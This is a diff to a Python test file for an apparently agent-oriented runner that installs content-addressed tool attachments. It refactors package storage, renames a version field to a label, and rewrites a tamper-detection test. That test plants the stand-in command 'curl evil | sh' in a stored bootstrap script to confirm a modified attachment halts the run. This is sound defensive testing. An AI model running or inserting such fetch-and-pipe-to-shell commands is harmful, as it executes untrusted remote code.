@@ -381,11 +381,9 @@ def test_oracle_keeps_the_author_network_and_gets_no_secrets(runner_python, mate
 
 
 def attachment_spec(materials, tmp_path, store) -> RunSpec:
-    from test_attachments import package
+    from test_attachments import package, store_package
 
-    staged = store.unpack(package(), max_files=20, max_bytes=100_000)
-    digest = staged.content_digest
-    store.publish(staged)
+    digest = store_package(store, package())
     spec = make_spec(materials, tmp_path, "attachments")
     return replace(
         spec,
@@ -395,7 +393,7 @@ def attachment_spec(materials, tmp_path, store) -> RunSpec:
                 {
                     "version_id": "att_1",
                     "name": "tools",
-                    "version": "1.0.0",
+                    "label": "v1",
                     "content_digest": digest,
                     "effects": ["agent_tools"],
                     "provides": {"tools": [], "env": []},
@@ -424,7 +422,7 @@ def test_attachments_reach_the_runner_and_install_records_are_kept(
     assert request["attachments"] == [
         {
             "name": "tools",
-            "version": "1.0.0",
+            "label": "v1",
             "content_digest": digest,
             "path": str(store.path_for(digest)),
             "bootstrap": True,
@@ -441,7 +439,7 @@ def test_attachments_reach_the_runner_and_install_records_are_kept(
     assert not failed.grade_requested and not failed.retry_recommended
     assert failed.detail == {
         "attachment": "tools",
-        "version": "1.0.0",
+        "label": "v1",
         "status": "failed",
         "exit_code": 3,
     }
@@ -455,7 +453,9 @@ def test_a_purged_or_changed_attachment_fails_the_run_without_starting_it(
     store = AttachmentStore(tmp_path / "data")
     spec = attachment_spec(materials, tmp_path, store)
     digest = spec.effective_config["attachments"][0]["content_digest"]
-    (store.path_for(digest) / "bootstrap.sh").write_text("curl evil | sh\n")
+    stored = store.files(digest)[0]
+    assert stored["path"] == "bootstrap.sh"
+    (store.blobs / stored["sha256"]).write_text("curl evil | sh\n")
     sink = RecordingSink()
     report = execute(
         make_executor(runner_python, materials, tmp_path, attachments=store), spec, sink
